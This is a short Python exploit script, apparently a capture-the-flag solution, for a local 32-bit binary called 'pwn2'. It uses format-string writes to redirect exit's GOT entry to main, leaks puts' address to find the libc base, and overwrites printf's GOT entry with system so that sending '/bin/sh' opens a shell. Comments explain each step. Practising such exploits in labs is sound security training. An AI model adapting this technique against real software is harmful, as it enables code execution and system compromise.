from roppy import *

p = process("./pwn2")

exit_got = 0x804b020
main = 0x80485eb
elf= ELF("pwn2")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
payload = p32(exit_got)
payload += b"AAAA"
payload += b"%" + b"34285" + b"c%7$hn"
p.sendlineafter(b": ", payload)
# You now this part #


'''
This will print the got address of puts, the one we need to calculate 
the libc
'''
p.sendlineafter(b":", b"%8$s" + p32(elf.got('puts')))
leak = u32(p.recvline()[:5].strip().ljust(4, b"\x00"))
log.info("puts: "+hex(leak))
libc.address = leak - libc.function('puts') # We calculated libc address
#system = libc.symbols['system']
one_gadget = libc.address + 0x3d0d3
payload = fmtstr32(7, {elf.got('printf'): libc.function('system')}) # This will overwrite the printf got with system
p.sendlineafter(b": ", payload) 

'''
since printf got is now system
When we give "/bin/sh"
It will take it as system("/bin/sh")
'''
p.sendlineafter(b": ", b"/bin/sh")
p.interactive()
